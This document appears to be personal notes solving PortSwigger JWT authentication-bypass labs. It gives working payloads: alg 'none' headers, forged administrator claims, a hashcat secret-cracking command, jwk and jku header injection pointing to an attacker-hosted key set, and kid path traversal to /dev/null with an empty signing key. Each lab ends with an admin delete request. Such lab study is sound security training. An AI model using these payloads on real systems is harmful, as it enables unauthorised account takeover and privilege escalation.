## General
- check signature validation (send JWT without signature)
- use hashcat to brute weak secrets using [this](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) 
  word-list or rockyou
- try to inject headers:
  - jwk (attack using jwt-editor)
  - jku (point to your keyset on your exploit server)
  - kid (path traversal to empty file or file with well known data)

## LABS payloads
#### JWT authentication bypass via unverified signature
- change username to admin in payload
```
{"iss": "portswigger","exp": 1778257898,"sub": "administrator"}
```
- go to /admin and delete carlos /admin/delete?username=carlos

#### JWT authentication bypass via flawed signature verification
- change header:
```
{"kid": "c5066f47-38ed-4bc0-a556-af7fe3091aaa","alg": "none"}
```
- change payload:
```
{"iss": "portswigger","exp": 1778258534,"sub": "administrator"}
```
- /admin/delete?username=carlos

#### JWT authentication bypass via weak signing key
- brute secret
```
hashcat -a 0 -m 16500 <jwt> <wordlist> --show
```
- generate new key and specify secret
- change payload to administrator
- sign
- delete 

#### JWT authentication bypass via jwk header injection
- go to the JWT Editor Keys tab. 
- generate a new RSA key. 
- send a request containing a JWT to Burp Repeater. 
- in the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload 
  (username to administrator) 
- click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key. 
- send the request to test how the server responds.
```
PS: Notice that after attack you might be redirected to login page. Just the go to /admin and it should work
```

#### JWT authentication bypass via jku header injection
- we have exploit server, so we need to define jku header pointing to our server with our set of keys
- attack using jwk
- paste jku to exploit body (check for encoding and non-printed chars)
```
{"keys": [{"kty": "RSA","e": "AQAB","kid": "af9aec6d-bd88-49ef-bc00-160e84b47ca3","n": "sIaDSuh3vmHExWQCbAdqeeaPHlhJU45iFSEO4xfvkD_Jayjjcdj99PfhteU4RYvFG-w6OnJIgYKisGZ-Plpf5LvBunsbiX4Wq2by0iwxYnEVmWNFONony67oLxEup7k8PmAgVpuQibvWMbdzMeRn6MTBpq7iIbkhg4BAHvOz5UeWWGft6OAwoAJwMCYxu4GbgMbIBBwBy9Jyi7T5Ec4HUMHrHohC0D-2zVpTOaKK1CBTai4zjh3Hx6q0Zgj7uJklb7w90XW602HS0Ls_gSryqWn2ufl0O_8o0E6bUYBRNigvV5dL5TimjyHUAfQez2-H4WMc6BqUwkVMEtTKMWAxuQ"}]}
```
- paste jku header to jwt
```
"jku": "https://exploit-...exploit-server.net/exploit"
```
- use your rsa key to sign
```
{ "kid": "af9aec6d-bd88-49ef-bc00-160e84b47ca3",
  "typ": "JWT",
  "alg": "RS256",
  "jku": "https://exploit-...exploit-server.net/exploit",
  "jwk": {
       "kty": "RSA",
       "e": "AQAB",
       "kid": "af9aec6d-bd88-49ef-bc00-160e84b47ca3",
       "n": "sIaDSuh3vmHExWQCbAdqeeaPHlhJU45iFSEO4xfvkD_Jayjjcdj99PfhteU4RYvFG-w6OnJIgYKisGZ-Plpf5LvBunsbiX4Wq2by0iwxYnEVmWNFONony67oLxEup7k8PmAgVpuQibvWMbdzMeRn6MTBpq7iIbkhg4BAHvOz5UeWWGft6OAwoAJwMCYxu4GbgMbIBBwBy9Jyi7T5Ec4HUMHrHohC0D-2zVpTOaKK1CBTai4zjh3Hx6q0Zgj7uJklb7w90XW602HS0Ls_gSryqWn2ufl0O_8o0E6bUYBRNigvV5dL5TimjyHUAfQez2-H4WMc6BqUwkVMEtTKMWAxuQ"
       }
}
```
- final JWT 
  - header:
  ```
  {
  "jku": "https://exploit-...exploit-server.net/exploit",
  "kid": "af9aec6d-bd88-49ef-bc00-160e84b47ca3", 
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "af9aec6d-bd88-49ef-bc00-160e84b47ca3",
    "n": "sIaDSuh3vmHExWQCbAdqeeaPHlhJU45iFSEO4xfvkD_Jayjjcdj99PfhteU4RYvFG-w6OnJIgYKisGZ-Plpf5LvBunsbiX4Wq2by0iwxYnEVmWNFONony67oLxEup7k8PmAgVpuQibvWMbdzMeRn6MTBpq7iIbkhg4BAHvOz5UeWWGft6OAwoAJwMCYxu4GbgMbIBBwBy9Jyi7T5Ec4HUMHrHohC0D-2zVpTOaKK1CBTai4zjh3Hx6q0Zgj7uJklb7w90XW602HS0Ls_gSryqWn2ufl0O_8o0E6bUYBRNigvV5dL5TimjyHUAfQez2-H4WMc6BqUwkVMEtTKMWAxuQ"
    }
  }
  ```
  - payload
  ```
  {
    "iss": "portswigger",
    "exp": 1778412233,
    "sub": "administrator"
  }
  ```
  - send:
  ```
  /admin/delete?username=carlos
  ```

#### JWT authentication bypass via kid header path traversal
- use empty value of /dev/null
- create symmetric key with empty key value
- attack jwk
- change kid to ../../../../../dev/null
- sign with empty key
- header
```
{
  "kid": "../../../../dev/null",
  "typ": "JWT",
  "alg": "HS256",
  "jwk": {
    "kty": "oct",
    "kid": "d62362c7-86ca-4915-b99c-fff31fb016c0",
    "k": ""
    }
  }
```
- payload
```
{"iss": "portswigger","exp": 1778415976,"sub": "administrator"}
```
```
/admin/delete?username=carlos
```